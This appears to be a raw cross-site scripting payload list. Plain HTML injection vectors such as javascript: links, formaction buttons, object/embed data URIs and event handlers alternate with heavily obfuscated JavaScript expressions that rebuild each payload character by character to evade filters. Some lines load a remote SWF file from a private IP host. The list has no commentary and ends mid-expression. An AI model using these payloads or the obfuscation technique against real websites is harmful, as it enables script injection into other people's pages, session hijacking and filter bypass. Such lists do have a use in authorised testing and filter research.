[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<a href="javascript:prompt(467)">show</a>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<a href='data:text/html,base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>show</a>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+(101))["to"+String["name"]]()[1]+([][""]+"")[2]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([][""]+"")[4]+([false]+"")[3]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+[])[0]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[2]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<form action="javascript:prompt(471)"><button>send</button></form>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[7]+(false+"")[1]+([false]+"")[3]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[3]+(true+"")[3]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<form id=x></form><button form=x formaction="javascript:prompt(473)">send</button>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[7]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+[0]+"")[7]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+([false]+"")[3]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[3]+(true+"")[3]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript:prompt(475)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="data:text/html,<script>prompt(477)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="data:text/html,base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+(101))["to"+String["name"]]()[1]+([][""]+"")[2]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([][""]+"")[4]+([false]+"")[3]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+[])[0]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[2]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="//10.10.24.100/xss.swf">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="//10.10.24.100/xss.swf" allowscriptaccess=always>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(false+"")[1]+(false+"")[2]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+"")[1]+([false]+"")[3]+([false]+"")[3]+(true+"")[3]+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<body onoload=prompt(485)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<input type=image src=x:x onerror=prompt(487)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<isindex onmouseover="prompt(489)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[3]+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<form oninput=prompt(491)><input></form>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<textarea autofocus onfocus=prompt(493)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+(false+"")[1]+(true+"")[1]+(true+"")[3]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+(false+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return 